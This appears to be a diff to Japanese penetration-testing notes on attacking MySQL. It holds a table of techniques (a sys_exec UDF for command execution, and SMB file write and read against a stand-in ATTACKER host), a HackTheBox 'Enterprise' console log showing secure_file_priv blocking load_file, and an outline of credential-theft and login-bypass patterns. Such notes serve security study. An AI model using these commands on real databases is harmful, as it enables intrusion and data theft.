@@ -26,7 +26,29 @@
   | 関数生成（`%MYSQL_HOME%\lib\plugin\udf.dll`） | `create function sys_exec returns int soname 'udf.dll'`      |
   | smbを利用したファイル書き出し                 | `select @@version into outfile '\\\\ATTACKER\\public\\file'` |
   | smbを利用したファイル読み出し                 | `select load_file('\\\\ATTACKER\\public\\file')`             |
-
+  
+* なお、load_fileはsecure_file_privが設定されている場合、rootであってもアクセス可能なファイルが制限される
+* Htb: Enterprise
+   ```console
+   MySQL [joomladb]> select load_file('/etc/hosts');
+   +-------------------------+
+   | load_file('/etc/hosts') |
+   +-------------------------+
+   | NULL                    |
+   +-------------------------+
+   1 row in set (0.386 sec)
+   
+   MySQL [joomladb]> show variables like 'secure_file_priv';
+   +------------------+-----------------------+
+   | Variable_name    | Value                 |
+   +------------------+-----------------------+
+   | secure_file_priv | /var/lib/mysql-files/ |
+   +------------------+-----------------------+
+   1 row in set (0.540 sec)
+   
+   MySQL [joomladb]>w
+   ```
+   
 * 攻撃のパターンは次のようになる。
   1. データベース内のクレデンシャルの漏洩
   2. データベース内に任意のクレデンシャルを追加することによるログインバイパス
@@ -117,3 +139,7 @@
     * sha1が20バイトのため、16進数表記で40文字
   * パスワード推定の場合、`$c`は16進数で使用する文字および$に限定可能である
     * `[a-f0-9$]`
+
+## Reference
+----
+* [mysql udf a penetration test](https://www.programmersought.com/article/84344091741/)
